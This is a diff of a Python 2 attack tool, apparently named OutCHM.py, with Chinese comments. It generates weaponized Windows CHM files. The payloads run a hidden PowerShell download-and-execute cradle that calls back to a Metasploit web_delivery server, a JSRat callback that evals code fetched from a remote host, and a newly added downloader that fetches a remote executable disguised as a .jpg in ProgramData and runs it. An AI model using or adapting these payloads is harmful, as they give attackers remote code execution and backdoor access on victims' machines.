@@ -16,40 +16,43 @@ OutCHM.py -p 'whoami > c://1.txt'
 ''', 
 epilog='方便快捷！')
 parser.add_argument('-p', '--payload', help='-p c:\\\windows\\\command')
-parser.add_argument('-r', '--rshell', help='-r http://192.168.0.100:8080')
-parser.add_argument('-j', '--jsrat', help='-j http://192.168.0.100:8000')
+parser.add_argument('-r', '--rshell', help='-r http://192.168.0.100:8080，通过powershll反弹msf后门，需要 msf exploit(web_delivery)')
+parser.add_argument('-j', '--jsrat', help='-j http://192.168.0.100:8000，通过js反弹JSRat，需要 JSRat.py -i 192.168.0.100 -p 8000')
+parser.add_argument('-d', '--download', help='-d http://exp.com/rat.exe，喜闻乐见下载者')
+# parser.add_argument('-c', '--custom', help='-c http://192.168.0.100/exp.txt 执行在线脚本')
 parser.add_argument('-o', '--outfile', help='-o exp.chm', default='exp.chm')
+parser.add_argument('-dec', '--decompile', help='反编译chm文件')
 args=parser.parse_args()
-
-# if args.payload is not None and args.rshell is not None and args.jsrat is not None:
-    # print '-p 或 -r 或 -j 只能选一个'
-    # sys.exit(0)
 
 if len(sys.argv) < 1:
     sys.exit(1)
 
+if args.decompile is not None:
+    os.system('hh -decompile out {0}'.format(args.decompile))
+    print '已反编译到「out」目录。'
+    sys.exit(0)
+
 command=' '
 
 if args.payload is not None:
-    # command=args.payload
     command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("' + args.payload + '",0,true);'
 
 if args.rshell is not None:
-    # command='powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;' + args.rshell + '&#39;));&cmd /c taskkill /f /im rundll32.exe'
-
-    # command='''javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;''' + args.rshell + '''&#39;));&cmd /c taskkill /f /im rundll32.exe'",0,true);'''
-    # windows8 測試通過，windows7 不通過
-
-    # command='''javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c $n=new-object net.webclient;$n.proxy=[Net.WebRequest]::GetSystemWebProxy();$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $n.downloadstring("''' + args.rshell + '''"));&cmd /c taskkill /f /im rundll32.exe'",0,true);'''
-
     command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString(&#39;'+args.rshell+'&#39;));&cmd /c taskkill /f /im rundll32.exe",0,true);'
     
 if args.jsrat is not None:
     command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","' + args.jsrat + '/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}'
-    # 這裡填入jsrat的修正版
 
-if command is None:
+if args.download is not None:
+  command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe Import-Module BitsTransfer;Start-BitsTransfer '+ args.download +' C:\\\\ProgramData\\\\write.jpg;cmd.exe /c C:\\\\ProgramData\\\\write.jpg;cmd /c taskkill /f /im rundll32.exe",0,true);'
+
+# if args.custom is not None:
+  # command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("' + args.custom + '");'
+
+
+if command == ' ':
     print '请输入参数'
+    sys.exit(0)
 
 exp_htm='''<!DOCTYPE html><html>
     <META content="text/html; charset=unicode" http-equiv=Content-Type>
